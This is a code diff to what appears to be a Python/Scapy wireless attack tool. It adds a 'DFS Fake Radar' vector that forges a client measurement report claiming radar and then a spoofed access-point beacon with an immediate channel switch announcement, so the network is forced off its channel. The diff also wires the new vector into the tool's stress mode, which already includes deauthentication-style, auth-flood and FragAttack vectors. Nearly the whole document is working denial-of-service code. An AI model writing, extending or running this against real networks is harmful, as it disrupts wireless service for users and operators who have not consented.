@@ -271,6 +271,7 @@ class AttackVector(Enum):
     TKIP_MIC = "TKIP/GCMP MIC Error"
     POWER_SAVE = "Power Save DoS"
     FRAGATTACK = "FragAttack Injection"
+    DFS_FAKE_RADAR = "Operating Channel Aggression"
 
 class AttackMode(Enum):
     STEALTH = 1
@@ -575,6 +576,48 @@ class RadioTapEngine:
                Raw(payload))
         return pkt
 
+    @staticmethod
+    def make_dfs_radar_report(radiotap, bssid, client, cur_ch):
+        """Build Spectrum Management Measurement Report with Radar bit set.
+
+        Operating Channel Aggression (DFS Fake Radar) — packet 1/2.
+        Spoofs a client→AP Basic Report claiming radar on cur_ch
+        (IEEE 802.11-2020 §9.4.2.22, Map bit3 = Radar).
+        """
+        # Category=0 Spectrum Mgmt, Action=1 Measurement Report, Dialog=1
+        body = struct.pack('BBB', 0, 1, 1)
+        # Measurement Report IE (ID=39, len=15): Basic Report + Radar map
+        body += struct.pack('BBBBB', 39, 15, 1, 0, 0)  # ID, len, token, mode, type
+        body += struct.pack('B', cur_ch & 0xFF)
+        body += struct.pack('<Q', int(time.time() * 1e6) & 0xFFFFFFFFFFFFFFFF)
+        body += struct.pack('<H', 50)  # duration TU
+        body += struct.pack('B', 0x08)  # Map: Radar detected
+
+        pkt = (radiotap /
+               Dot11(type=0, subtype=13,
+                     addr1=bssid, addr2=client, addr3=bssid) /
+               Raw(body))
+        return pkt
+
+    @staticmethod
+    def make_dfs_vacate_csa(radiotap, bssid, ssid, cur_ch, safe_ch):
+        """Build spoofed AP CSA beacon forcing immediate channel vacation.
+
+        Operating Channel Aggression (DFS Fake Radar) — packet 2/2.
+        Simulates the AP's mandatory DFS response: stop TX + switch.
+        """
+        _validate_channel(safe_ch)
+        ssid_b = _ssid_bytes(ssid)
+        pkt = (radiotap /
+               Dot11(type=0, subtype=8,
+                     addr1="ff:ff:ff:ff:ff:ff",
+                     addr2=bssid, addr3=bssid) /
+               Dot11Beacon(cap="ESS+privacy") /
+               Dot11Elt(ID="SSID", info=ssid_b) /
+               Dot11Elt(ID="DSset", info=bytes([cur_ch & 0xFF])) /
+               Dot11EltCSA(mode=1, new_channel=safe_ch, channel_switch_count=0))
+        return pkt
+
 
 # ============================================================
 #               PACKET FACTORY
@@ -634,7 +677,16 @@ class PacketFactory:
             rt, t.bssid, cm, seq_num=frag_seq)
         self.frag_payload = RadioTapEngine.make_frag_payload(
             rt, t.bssid, cm, seq_num=frag_seq)
-        
+
+        # DFS Fake Radar (Operating Channel Aggression): radar report + vacate CSA
+        cur_ch = t.channel & 0xFF
+        dfs_ch = {52, 56, 60, 64} | set(range(100, 145))
+        safe_ch = nch if (1 <= nch <= 165 and nch not in dfs_ch) else (36 if cur_ch >= 36 else 1)
+        self.dfs_radar_report = RadioTapEngine.make_dfs_radar_report(
+            rt, t.bssid, cm, cur_ch)
+        self.dfs_vacate_csa = RadioTapEngine.make_dfs_vacate_csa(
+            rt, t.bssid, t.ssid, cur_ch, safe_ch)
+
         self.chaff_packets = []
         for _ in range(5):
             self.chaff_packets.append(self._make_chaff())
@@ -675,6 +727,7 @@ class PacketFactory:
             AttackVector.DELBA_ATTACK: [self.delba],
             AttackVector.AUTH_DOS: self.auth_pool,
             AttackVector.FRAGATTACK: [self.frag_setup, self.frag_payload],
+            AttackVector.DFS_FAKE_RADAR: [self.dfs_radar_report, self.dfs_vacate_csa],
         }
         return mapping.get(vector, [self.csa_beacon])
 
@@ -1874,6 +1927,16 @@ def run_stress_mode(iface: str, scan_5ghz: bool = False, mode: AttackMode = Atta
                 if AttackVector.AUTH_DOS in vectors:
                     fake_mac = ':'.join(f'{random.randint(0,255):02x}' for _ in range(6))
                     pkts_to_send.append(RadioTapEngine.make_auth_frame(rt, bssid, fake_mac))
+                if AttackVector.DFS_FAKE_RADAR in vectors:
+                    fake_cli = ':'.join(f'{random.randint(0,255):02x}' for _ in range(6))
+                    dfs_set = {52, 56, 60, 64} | set(range(100, 145))
+                    safe = 36 if cur_ch >= 36 else 1
+                    if safe in dfs_set:
+                        safe = 36
+                    pkts_to_send.append(RadioTapEngine.make_dfs_radar_report(
+                        rt, bssid, fake_cli, cur_ch))
+                    pkts_to_send.append(RadioTapEngine.make_dfs_vacate_csa(
+                        rt, bssid, ssid, cur_ch, safe))
                 
                 for p in pkts_to_send:
                     try:
